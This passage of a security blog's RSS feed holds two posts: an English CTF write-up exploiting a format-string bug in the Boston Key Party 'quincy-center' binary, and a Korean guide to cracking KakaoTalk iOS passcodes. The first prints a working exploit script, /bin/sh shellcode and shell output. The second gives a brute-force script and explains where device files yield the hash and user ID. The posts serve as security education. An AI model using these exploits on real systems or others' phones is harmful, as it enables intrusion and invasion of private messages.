<p>Amusingly, we will be using the same primitive to get a shell under <strong>tz</strong> context in the next series.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>[bkpCTF-2015] quincy-center (uspace) write-up</title>
		<link>https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/</link>
		<comments>https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/#comments</comments>
		<pubDate>Sun, 08 Mar 2015 00:10:14 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Hacking/PPP]]></category>
		<category><![CDATA[2015]]></category>
		<category><![CDATA[bkpCTF]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[PPP]]></category>
		<category><![CDATA[pwnable]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=1901</guid>
		<description><![CDATA[This is a write-up for quincy-center challenge, which is the first part of 3-chained pwnable challenge from Boston Key Party CTF last weekend. You can read about the other parts here: quincy-adams, braintree. The binaries were packaged&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>This is a write-up for <strong>quincy-center</strong> challenge, which is the first part of 3-chained pwnable challenge from <a href="https://ctftime.org/event/163" target="_blank" title="">Boston Key Party CTF</a> last weekend. You can read about the other parts here: <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-adams-kspace-write-up/" target="_blank" title="">quincy-adams</a>, <a href="https://www.bpak.org/blog/2015/03/bkpctf-2015-braintree-tz-write-up/" target="_blank" title="">braintree</a>.</p>
<p>The binaries were packaged into a <a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/zenhv-e941cb4585deafcf5a1b86050a3ebe7a.gz" target="_blank" title="">tar ball</a>.</p>
<blockquote><p>The MBTA wrote a cool system. It&#8217;s pretty bad though, sometimes the commands work, sometimes they don&#8217;t&#8230;<br />
Exploit it. (uspace flag) 54.165.91.92 8899</p></blockquote>
<p>The goal is to get &#8220;uspace&#8221; flag by exploiting the user space process.</p>
<p>Looking at the output of <pre class="crayon-plain-tag">file</pre> , these are all x86_64 binaries.</p><pre class="crayon-plain-tag">$ file uspace 
uspace: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=98a138f60a8cfd6239de3181ef118776db40c8e6, stripped</pre><p>
Opening up in IDA Pro, we see that <pre class="crayon-plain-tag">sub_401470</pre> has the process loop that prompts &#8220;bksh&gt; &#8221; like a shell environment.</p>
<div id="attachment_1911" style="width: 569px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_1.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1911" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_1.png" alt="" width="559" height="534" /></a><p class="wp-caption-text">bksh (uspace) command line parser</p></div>
<p>&nbsp;</p>
<p>First, we see that there are semaphore locking/unlocking for I/O operations, which don&#8217;t seem to be too important at the moment. Then, the code to parse the command follows.</p>
<p>The general scheme for how the system works will be explained in the next series (kspace), so we will leave out the details of how things are implemented and maintained for now. Understanding the operations (create, list, remove, etc.) abstractly is good enough for exploiting the user space :)</p>
<p>There are total of 6 commands it understands: <strong>ls</strong>, <strong>create</strong>, <strong>rm</strong>, <strong>cat</strong>, <strong>sleep</strong>, and <strong>exit</strong>.</p>
<ul>
<li>ls &#8211; lists files on the system</li>
<li>create &#8211; creates a new file on the system</li>
<li>rm &#8211; deletes a file on the system</li>
<li>sleep &#8211; sleep&#8230;</li>
<li>exit &#8211; exits the shell</li>
</ul>
<p>Let&#8217;s look at what <strong>create</strong> does for us.</p>
<p>The function takes the first argument to the command as a file name, and reads 256 bytes from the user for the content of the file that is being created. The buffer that is being read is large enough, so there&#8217;s no overflow here. Then, it &#8220;calls&#8221; into the kernel &#8220;syscall&#8221; (via shared memory) with the syscall number 96 and its two arguments (file name &amp; contents buffer). Everything seems normal and sane, so we move on.</p>
<div id="attachment_1915" style="width: 596px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_2.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1915 size-full" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_2.png" alt="" width="586" height="257" /></a><p class="wp-caption-text">create syscall (from uspace to kspace)</p></div>
<p>&nbsp;</p>
<p>Looking through more functions, we find a vulnerable code in <strong>cat</strong>, where it uses <pre class="crayon-plain-tag">sprintf</pre> with the file contents buffer as its format string (aka trivial buffer overflow).</p>
<div id="attachment_1918" style="width: 591px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_3.png" data-rel="lightbox-image-2" data-rl_title="" data-rl_caption="" title=""><img class="wp-image-1918" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_3.png" alt="" width="581" height="552" /></a><p class="wp-caption-text">&#8220;cat&#8221; operation (open syscall followed by read syscall)</p></div>
<p>&nbsp;</p>
<p><strong>v12</strong> is a stack buffer of size 256 bytes, and it&#8217;s located <strong>bp-0x118</strong>. Also, we noticed that the NX was disabled on this binary, so we could easily jump to our buffer (such as one of our arguments for the command). Conveniently, the pointers to our arguments are on the stack, so we can do a simple pop/pop/ret gadget to get an arbitrary code execution :D</p><pre class="crayon-plain-tag">#!/usr/bin/python
import struct

def p(v):
    return struct.pack('&lt;Q', v)

def u(v):
    return struct.unpack('&lt;Q', v)[0]

f = open('payload', 'wb')

pop_pop_ret = 0x40110F

f.write('create fmt\n'.ljust(0x400, '#'))

payload = '%280x' + p(pop_pop_ret)
f.write(payload.ljust(0x100, '\0'))

f.write(('cat fmt ' + open('shell.bin').read()+ '\n').ljust(0x400, '#'))</pre><p>
</p><pre class="crayon-plain-tag">[BITS 64]

section .text
global _start
_start:

lea rdi, [rel binsh]
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall

binsh:
db '/bin/sh',0</pre><p>
</p><pre class="crayon-plain-tag">$ nasm shell.asm -f bin -o shell.bin
$ python pwn_uspace.py
$ (cat ../uspace/payload; cat -) | sudo ./tz
bksh&gt; bksh&gt;
whoami
uspace</pre><p>
We have successfully got a shell as <em>uspace</em> user.<br />
(Note that since the challenge servers are down, the exploitation is shown in a local setup.)</p>
<p>Once we have arbitrary code running on uspace, we can then perform syscalls that are exposed by the kernel, but not available through a user-space interface (such as syscall number 92, shown below).</p>
<div id="attachment_1929" style="width: 820px" class="wp-caption aligncenter"><a href="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_4.png" data-rel="lightbox-image-3" data-rl_title="" data-rl_caption="" title=""><img class=" wp-image-1929" src="https://www.bpak.org/blog/wp-content/uploads/2015/03/uspace_4.png" alt="" width="810" height="547" /></a><p class="wp-caption-text">kspace syscall handler</p></div>
<p>The analysis of kspace &amp; tz will be continued on the next post.</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2015/03/bkpctf-2015-quincy-center-uspace-write-up/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
		</item>
		<item>
		<title>[KakaoTalk-iOS] 암호잠금 (Passcode) 풀기</title>
		<link>https://www.bpak.org/blog/2015/01/kakaotalk-ios-%ec%95%94%ed%98%b8%ec%9e%a0%ea%b8%88-passcode-%ed%92%80%ea%b8%b0/</link>
		<comments>https://www.bpak.org/blog/2015/01/kakaotalk-ios-%ec%95%94%ed%98%b8%ec%9e%a0%ea%b8%88-passcode-%ed%92%80%ea%b8%b0/#comments</comments>
		<pubDate>Sun, 11 Jan 2015 11:38:43 +0000</pubDate>
		<dc:creator><![CDATA[Cai]]></dc:creator>
				<category><![CDATA[Hacking/Crack]]></category>
		<category><![CDATA[Hacking/Tools]]></category>
		<category><![CDATA[Life/Outta school]]></category>
		<category><![CDATA[crack]]></category>
		<category><![CDATA[iOS]]></category>
		<category><![CDATA[keychain]]></category>
		<category><![CDATA[passcode]]></category>
		<category><![CDATA[카카오톡]]></category>

		<guid isPermaLink="false">https://www.bpak.org/blog/?p=1862</guid>
		<description><![CDATA[보통 프로토콜/바이너리 분석 관련 주제만 다루어 왔어서 글을 쓸 기회는 없었는데, 어제 SNS에서 아이폰용 카카오톡 암호를 풀어주는 툴을 보고 간략하게 몇 글자 적어야겠다는 생각이 들었습니다 :) 툴이 오픈소스가 아닌지라 기능을 직접 구현하고 싶어하시는 분들이나 어떻게&#46;&#46;&#46;]]></description>
				<content:encoded><![CDATA[<p>보통 프로토콜/바이너리 분석 관련 주제만 다루어 왔어서 글을 쓸 기회는 없었는데, 어제 SNS에서 아이폰용 카카오톡 암호를 풀어주는 툴을 보고 간략하게 몇 글자 적어야겠다는 생각이 들었습니다 :)</p>
<p>툴이 오픈소스가 아닌지라 기능을 직접 구현하고 싶어하시는 분들이나 어떻게 암호를 크랙할 수 있는지 알고 싶으신 분들에게 어려움이 있을 수 있다는 생각에서 쓴 글이고, 목표 자체가 해당 툴의 기능을 재현하는것이었기 때문에 안드로이드 쪽은 분석하지 않았습니다 &#8212; 테스트할 기기가 없다는게 더 큰 이유지만&#8230; 독자분들의 과제로 남겨두도록 하겠.. (쿨럭)</p>
<p>&nbsp;</p>
<h2>Crack It!</h2>
<p>사실 카카오톡 passcode에 대한 문제점은 초기때부터 지금까지 쭈욱 있어왔다. 초기 시절에는 평문으로 저장이 되어있었고, 그 이후에는 &#8216;a&#8217;를 salt로 한 해쉬값을 이용했었던 적이 있고, 지금은 조금은 달라졌지만 결국엔 SHA256를 이용한 해쉬를 쓰는데, 이 값은 <strong>순정폰에서도</strong> 뽑아낼 수 있기 때문에.. 어떤값을 이용해서 해쉬가 생성되는지만 알면 잠금에 사용된 암호를 알아내는건 무척 쉽다.</p>
<p>일단, 비밀번호를 크랙하려면 두 가지 재료가 필요하다: EncryptedPasscode와 UserId.</p>
<p>아래에서 좀 더 보겠지만, 말이 &#8220;encrypted&#8221;지 사실은 그냥 &#8220;hashed&#8221;다. 물론 그냥 비밀번호를 그대로 해쉬한건 아니다..<br />
UserId는 이전 포스팅들에서도 여러번 언급한대로 해당 유져의 고유 번호이다.</p>
<p>이 재료들을 구하는 방법을 소개한다.</p>
<p><strong>첫번째</strong> <strong>재료</strong>인 EncryptedPasscode는 <em>com.iwilab.KakaoTalk.plist</em> 파일 안에 존재하는데, 이 파일은 순정폰에서도 i-Funbox 등을 이용하면 쉽게 읽을 수 있다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_1.png" data-rel="lightbox-image-0" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter  wp-image-1875" src="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_1.png" alt="" width="810" height="513" /></a></p>
<p>해당 plist파일을 읽어보면 다음과 같이 EncryptedPasscode 키에 해당하는 값을 볼 수 있다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_3.png" data-rel="lightbox-image-1" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter size-full wp-image-1882" src="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_3.png" alt="" width="679" height="163" /></a></p>
<p>&nbsp;</p>
<p><strong>두번째 재료</strong>인 UserId 역시 i-Funbox등을 통해 <em>Talk.sqlite</em> 파일을 뽑아내서 읽으면 된다. 물론 sqlite DB 파일이므로 읽을 수 있는 툴을 사용해야 하는데, 윈도우에서는 DB Browser 같은걸 쓰면 된다 &#8212; 리눅스나 맥에서는 그냥 sqlite cli를 사용해도 된다.</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_2.png" data-rel="lightbox-image-2" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter wp-image-1879" src="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_2.png" alt="" width="810" height="513" /></a></p>
<p>DB 파일을 로드한 뒤에, <strong>ZUSER 테이블</strong>을 보면 Z_PK == 1 에 해당하는, 즉 자기 자신의 <strong>ZID 칼럼</strong>을 보면 된다.</p>
<p>(내 UserId를 알만한 사람들은 이미 알고 있겠지만 ㅜㅜ 그나마 설명에 필요없는 몇자리라도 가려보려고 노력해본다..쿨럭)</p>
<p><a href="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_4.png" data-rel="lightbox-image-3" data-rl_title="" data-rl_caption="" title=""><img class="aligncenter  wp-image-1883" src="https://www.bpak.org/blog/wp-content/uploads/2015/01/kakao_pin_4.png" alt="" width="969" height="419" /></a></p>
<p>&nbsp;</p>
<p>자, 필요한 재료들이 다 모였으니 요리를 해보자(?)</p>
<p>이번 요리의 레시피는 다음과 같다.</p><pre class="crayon-plain-tag">import hashlib
import itertools

### FILL THESE!!!
USER_ID   = ''
ENC_PASS  = ''
###

assert len(USER_ID) &gt;= 4 and len(ENC_PASS) == 64
userid = USER_ID[::-1][:4]
for i in xrange(0, 10000):
  sha = hashlib.sha256(''.join(itertools.chain.from_iterable(itertools.izip_longest('%04d' % i, userid))))
  if sha.hexdigest() == ENC_PASS:
    print 'Found Passcode: %04d' % i
    break</pre><p>
간단하지 아니한가?!</p>
<p>일부러 좀 있어보이게 하려고 itertools 모듈을 썼는데, 풀어서 쓰면 진짜 간단하다.</p>
<p>즉, iOS용 카카오톡에서 사용하는 EncryptedPasscode는 다음과 같은 &#8216;<del>알고리즘</del> 규칙 (-_-)&#8217; 으로 만들어진다:</p>
<ol>
<li>우선 UserId의 마지막 네자리를 뒤에서부터 읽는다 =&gt; 예를들어, 자신의 UserId가 12345678 이라면, <span style="text-decoration: underline;">8765</span>가 되는것이다.</li>
<li>네자리 수 Passcode의 각각 한 글자와 위에서 얻은 네자리 수 각각 한 글자를 번갈아가며 섞는다<br />
=&gt; 예를들어, passcode가 <strong>0103</strong>이라면, <strong>0</strong><span style="text-decoration: underline;">8</span><strong>1</strong><span style="text-decoration: underline;">7</span><strong>0</strong><span style="text-decoration: underline;">6</span><strong>3</strong><span style="text-decoration: underline;">5</span>가 되는것이다.</li>
<li>스텝 2에서 만들어진 문자열을 sha256 해쉬한다 =&gt; sha256(&#8220;08170635&#8221;) &#8211;&gt; 71960ab60fc2b308d4a16b0c590c23e2b562224ec82ae067935dcdad692b22e3</li>
</ol>
<p>마지막 스텝에서 만들어진 sha256 해쉬가 EncryptedPasscode다.</p>
<p>물론 우리는 Passcode를 모른다는 가정하에 있기 때문에, 0000부터 9999까지 bruteforce를 해줘야한다.</p>
<p>그걸 해주는게 위의 짤막한 코드.</p>
<p>제일 마지막에 있는 9999까지 가는데 성능도 그닥 좋지 않은 머신에서 0.03초정도 걸린다.<br />
(만약에 iOS환경에서 위에서 설명된대로 했는데도 아무 결과가 나오지 않는다면.. 자네가 무언가 잘못한거라네..ㅋㅋ)</p>
<p>&nbsp;</p>
<h2>급하게(?) 맺는말</h2>
<p>결론적으로, 안드로이드에서든 iOS에서든 카카오톡에 내장되어있는 숫자암호를 너무 믿으면 안된다. 이건 비단 카카오톡의 문제라기보다는 암호가 4자리 숫자 밖에 되지 않으므로 가능성이 10000개 (사람이 치려면 고생 좀 하겠지만, 불가능한것은 아니고, 컴퓨터는 1초도 채 안걸리는 작업량이다..) 밖에 되지 않는다는데 있다.</p>
<p>한가지 아쉬운점은 이 작업을 (적어도 순정폰에서는) 어렵게 하기 위해서 Keychain을 썼으면 더 좋았을텐데, 그러지 않았다는 점이다 &#8212; 왜 카카오쪽에서 keychain을 쓰지 않고 굳이 파일/DB를 이용한 자체적인 데이터 스토리지를 사용하는지에 대해선 듣긴 했지만&#8230;ㅜㅜ</p>
<p>유져 입장에서 조금 더 안전하게 사용하기 위해서는, 다음 지침을 생활화하자:<br />
<strong>1.</strong> 일단 폰 자체의 암호 시스템을 이용한다 (패스워드/패스코드/지문인식)<br />
<strong>2.</strong> 자신이 사용중이 아닐때는 반드시 잠금상태로 유지한다<br />
<strong>3.</strong> 보안이 확실한 개인 컴퓨터/기기가 아닐 경우, 폰을 연결했을때 &#8220;이 컴퓨터를 신뢰하겠습니까?&#8221; 메세지에서 &#8220;신뢰하지 않음&#8221;을 누른다</p>
<p>끝!</p>
<p>궁금하신 점은 메일이나 댓글로~~</p>
<p><span style="text-decoration: underline;">아참. 악용하진 말자.</span><br />
정말 자신의 비밀번호를 까먹었거나&#8230; 혹은 친구들의 장난으로 묶인(?) 경우에만 사용하자 &#8212; 실제로 이 일이 나에게 일어났었다 ㅠㅠ</p>
<p>&nbsp;</p>
<p><strong>PS.</strong> 그나저나 오랜만에 plist를 살펴봤는데, 초창기에 지적했던 session key가 아직도 (아마도?) 평문으로 저장되어있다. 물론 요즘엔 이전과 달리 세션키&#8221;만&#8221; 가지고는 상대방의 메세지를 임의로 읽거나 보낼 수 없지만.. 그걸 하는데 필요한 device_uuid 마저도 plist에 고스란히 저장되어있다 ㅠㅠ 물론 암호화 되어있는거 같긴 하지만.. 이 역시 아마 고정키로 AES암호화 했을터.. 이걸 다시금 깨닫고 나니 정말 폰관리를 잘해야겠다는 생각이&#8230;ㄷㄷ &#8212; 이 문제의 개선방법은 위에서도 언급한 keychain 사용이다.. 물론 폰 자체가 루팅당하면 답 없지만서도.. 그건 아예 스케일이 다른 공격이니까..</p>
<p>&nbsp;</p>
]]></content:encoded>
			<wfw:commentRss>https://www.bpak.org/blog/2015/01/kakaotalk-ios-%ec%95%94%ed%98%b8%ec%9e%a0%ea%b8%88-passcode-%ed%92%80%ea%b8%b0/feed/</wfw:commentRss>
		<slash:comments>20</slash:comments>
		</item>
	</channel>
</rss>

<!--
Performance optimized by W3 Total Cache. Learn more: https://www.w3-edge.com/products/

Object Caching 269/271 objects using disk
Page Caching using disk: enhanced (SSL caching disabled) 

Served from: www.bpak.org @ 2019-05-12 07:11:52 by W3 Total Cache
-->